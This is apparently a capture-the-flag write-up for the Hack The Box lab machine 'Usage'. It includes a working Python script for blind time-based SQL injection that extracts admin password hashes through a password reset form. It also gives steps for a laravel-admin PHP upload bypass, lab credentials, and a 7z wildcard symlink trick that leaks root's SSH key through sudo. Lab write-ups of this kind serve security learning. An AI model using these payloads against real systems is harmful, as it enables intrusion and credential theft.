# Usage

## Info

Usage is an easy linux machine from hack the box.

## Nmap

Open tcp ports.

```
22
80
```

## User

There is a blind time based sql injection in the reset password functionality.

```python
def extract_info():
    
    valid_chars = string.ascii_uppercase + string.ascii_lowercase + string.digits + '$\./'

    #valid_chars = string.ascii_lowercase + string.digits

    FOUND = True

    found_chars = ['']

    new_found_chars = []

    while(FOUND):

        FOUND = False

        for found_c in found_chars:
            for valid_c in valid_chars:

                c = found_c + valid_c
        
                data_dict = {'_token' : TOKEN, 'email' : ''}

                data_dict['email'] = f"admin@usage.htb' UNION SELECT 1,2,3,if((SELECT count(*) FROM admin_users WHERE password LIKE BINARY \"{c}%\") > 0,benchmark(10000000,MD5(1)), 'false'),5,6,7,8 -- -"

                t0 = time.time()

                resp = requests.post(url, data=data_dict, cookies=cookies_dict)

                t1 = time.time()

                total_time = t1 - t0

                if total_time > 4:
                    print(c, total_time)
                    new_found_chars.append(c)
                    FOUND = True
        
        found_chars = new_found_chars

```

Admin password

```
whatever1
```

laravel-admin is vulnerable to a file upload vulnerability.

```
1. upload a php script php.jpg
2. after upload success, re-upload and change file name to php.jpg.php
3. file location is uploads/images/
```

## root

user xander password is in .monitrc of dash user home directory.

```
3nc0d3d_pa$$w0rd
```

sudo allows a binary to run which uses 7z to zip /var/html/www.

```
1. place file @id_rsa in /var/html/www
2. create link ln -s /root/.ssh/id_rsa id_rsa
3. run sudo binary
```

This will exploit the wildcard vuln and out put the ssh key as an error because it cannot be zipped.
